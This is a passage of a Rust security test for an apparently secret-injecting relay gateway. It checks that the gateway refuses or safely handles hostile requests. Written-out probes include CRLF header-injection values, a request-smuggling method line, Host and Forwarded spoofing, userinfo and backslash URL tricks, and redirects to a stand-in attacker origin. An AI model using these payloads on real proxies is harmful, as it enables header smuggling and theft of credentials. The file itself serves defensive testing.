        probe("ph-body", Class::Ok, &format!("{api}/g3/ph-body"))
            .headers(&[("Content-Type", "text/plain")])
            .method("POST")
            .body("token={secret}"),
        probe(
            "ph-encoded",
            Class::Ok,
            &format!("{api}/g3/ph-encoded/%7Bsecret%7D?k=%7Bsecret%7D"),
        ),
        // CRLF: header value, header name, method; in the URL the parser drops CR and LF.
        probe("crlf-value", Class::Bad, &format!("{api}/g3/crlf-value"))
            .headers(&[("X-A", "v\r\nX-Injected: {secret}")]),
        probe(
            "crlf-value-lf",
            Class::Bad,
            &format!("{api}/g3/crlf-value-lf"),
        )
        .headers(&[("X-A", &format!("v\nHost: {evil_host}"))]),
        probe("crlf-name", Class::Bad, &format!("{api}/g3/crlf-name"))
            .headers(&[("X-A\r\nX-Injected", "v")]),
        probe("crlf-method", Class::Bad, &format!("{api}/g3/crlf-method")).method(&format!(
            "GET {evil_origin}/x HTTP/1.1\r\nX-Injected: 1\r\n\r\nGET"
        )),
        probe(
            "crlf-url",
            Class::Ok,
            &format!("{api}/g3/crlf-url\r\nX-Injected: {{secret}}\r\nHost: {evil_host}"),
        ),
        // Host tricks.
        probe("host-header", Class::Ok, &format!("{api}/g3/host-header"))
            .headers(&[("Host", &evil_host)]),
        probe("forwarded", Class::Ok, &format!("{api}/g3/forwarded")).headers(&[
            ("X-Forwarded-Host", &evil_host),
            ("Forwarded", &format!("host={evil_host}")),
            ("X-Original-URL", &format!("{evil_origin}/steal")),
        ]),
        probe(
            "userinfo",
            Class::Denied,
            &format!("http://upstream.test:{api_port}@{evil_host}/g3/userinfo"),
        ),
        probe(
            "userinfo-at-api",
            Class::Denied,
            &format!("http://user:{{secret}}@upstream.test:{api_port}/g3/userinfo-at-api"),
        ),
        probe(
            "backslash",
            Class::Denied,
            &format!("http://{evil_host}\\@upstream.test:{api_port}/g3/backslash"),
        ),
        // Outside the binding: the attacker's host, another port, another name, another scheme.
        probe(
            "unbound-evil",
            Class::Denied,
            &format!("{evil_origin}/g3/unbound-evil"),
        ),
        probe(
            "unbound-port",
            Class::Denied,
            &format!("http://upstream.test:{evil_port}/g3/unbound-port"),
        ),
        probe(
            "unbound-name",
            Class::Denied,
            &format!("http://localhost:{api_port}/g3/unbound-name"),
        ),
        probe(
            "unbound-https",
            Class::Denied,
            &format!("https://upstream.test:{api_port}/g3/unbound-https"),
        ),
    ];
    // Redirects from the provider to the attacker's host.
    for code in [301, 302, 303, 307, 308] {
        let mut p = probe(
            &format!("redirect-{code}"),
            Class::Redirect,
            &format!("{api}/g3/redirect-{code}?redirect={code}&to={evil_origin}/steal-{code}"),
        );
        if code >= 307 {
            p = p.method("POST").body("r");
        }
        probes.push(p);
    }
    probes.push(probe(
        "redirect-relative",
        Class::Redirect,
        &format!("{api}/g3/redirect-relative?redirect=302&to=//{evil_host}/steal"),
    ));

    let mut sent = 0;
    let mut denied = 0;
    let mut results = String::new();
    for p in &probes {
        let mut req = serde_json::json!({
            "secret_id": SECRET, "version": 1, "method": p.method, "url": p.url,
            "headers": p.headers,
        });
        if let Some(b) = &p.body {
            req["body"] = serde_json::Value::String(b.clone());
        }
        let (status, raw) = h.call(Some(h.token.as_str()), req).await;
        w.save(&format!("raw-{}.out", p.name), &raw);
        w.save(&format!("raw-{}.view", p.name), &view(&raw));
        let json: serde_json::Value = serde_json::from_slice(json_part(&raw)).unwrap_or_default();
        let upstream = json["status"].as_u64().unwrap_or(0);
        let slug = json["error"].as_str().unwrap_or("-").to_owned();
        results.push_str(&format!(
            "{} {:?} gateway={status} upstream={upstream} error={slug}\n",
            p.name, p.class
        ));
        let n = &p.name;
        match p.class {
            Class::Ok => {
                assert!(
                    status == StatusCode::OK && upstream == 200,
                    "{n}: gateway {status}, upstream {upstream} (expected 200/200)"
                );
                sent += 1;
            }
            Class::Redirect => {
                assert!(
                    status == StatusCode::OK && (301..=308).contains(&upstream),
                    "{n}: gateway {status}, upstream {upstream} (expected a 3xx)"
                );
                sent += 1;
            }
            Class::Bad => assert!(
                status == StatusCode::BAD_REQUEST && slug == "bad_request",
                "{n}: gateway {status} {slug} (expected 400 bad_request)"
            ),
            Class::Denied => {
                assert!(
                    status == StatusCode::FORBIDDEN && slug == "denied",
                    "{n}: gateway {status} {slug} (expected 403 denied)"
                );
                denied += 1;
            }
        }
    }

    // An absolute-form request line and a Host naming the attacker's host, sent to the gateway
    // itself: it routes by path and relays to the bound URL in the body only.
    let body = serde_json::json!({
        "secret_id": SECRET, "version": 1, "method": "GET", "url": format!("{api}/g3/absolute-form"),
    });
    let resp = h
        .app
        .clone()
        .oneshot(
            Request::post(format!("{evil_origin}/v1/relay"))
                .header("host", evil_host.as_str())
                .header("authorization", format!("Bearer {}", h.token))
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let status = resp.status();
    let raw = resp.into_body().collect().await.unwrap().to_bytes();
    w.save("raw-absolute-form.out", &raw);
    assert_eq!(status, StatusCode::OK, "absolute-form probe");
    sent += 1;

    w.save("results.txt", results.as_bytes());

    // The attacker's host received nothing; what it did receive would go to the oracle.
    let got = evil.received_requests().await.unwrap_or_default();
    let mut log = String::new();
    for r in &got {
        log.push_str(&format!("{} {}\n{:?}\n", r.method, r.url, r.headers));
        log.push_str(&String::from_utf8_lossy(&r.body));
        log.push('\n');
    }
    w.save("evil-hits.log", log.as_bytes());
    assert!(
        got.is_empty(),
        "the attacker's host received {} request(s)",
        got.len()
    );

    // The provider: one request per sent probe, the key only in the single bound header, no
    // header smuggled in by CRLF, and every placeholder sent literally.
    let reqs = h.upstream.received_requests().await.unwrap();
    assert_eq!(reqs.len(), sent, "one provider request per sent probe");
    for r in &reqs {
        let names: Vec<&str> = r.headers.iter().map(|(k, _)| k.as_str()).collect();
        assert!(
            !names.contains(&"x-injected"),
            "smuggled header reached the provider"
        );
        assert!(
            !names.contains(&"proxy-authorization"),
            "Proxy-Authorization reached the provider"
        );
        assert_eq!(r.headers.get_all("authorization").iter().count(), 1);
        assert!(
            r.headers.get("authorization").unwrap().as_bytes() == w.injected().as_bytes(),
            "injected authorization differs"
        );
        assert_key_nowhere_else(&w, r);
    }
    for (n, needle) in [
        ("ph-header", "x-leak: {secret}"),
        ("ph-header", "x-leak-bearer: Bearer {secret}"),
        ("ph-path", "/g3/ph-path/%7Bsecret%7D"),
        ("ph-query", "k={secret}"),
        ("ph-body", "body: token={secret}"),
        ("override", "authorization: Bearer [REDACTED"),
    ] {
        let v = String::from_utf8_lossy(
            &std::fs::read(w.artifacts.join(format!("raw-{n}.view"))).unwrap(),
        )
        .into_owned();
        assert!(v.contains(needle), "{n}: the reflection lacks {needle:?}");
    }

    // Refusals happen before any decrypt: an attempt (appended before every decrypt) only for
    // sent probes, and one `relay.denied` event per refusal.
    let ev = h.audit.events();
    let attempts = ev
        .iter()
        .filter(|e| matches!(e.kind, EventKind::Attempt))
        .count();
    let denials = ev
        .iter()
        .filter(|e| matches!(e.kind, EventKind::Denied(_)))
        .count();
    assert_eq!(
        attempts, sent,
        "an attempt only for each probe that was sent"
    );
    assert_eq!(denials, denied, "one relay.denied per refusal");
    h.assert_audit_clean();
    w.judge("G3");
}
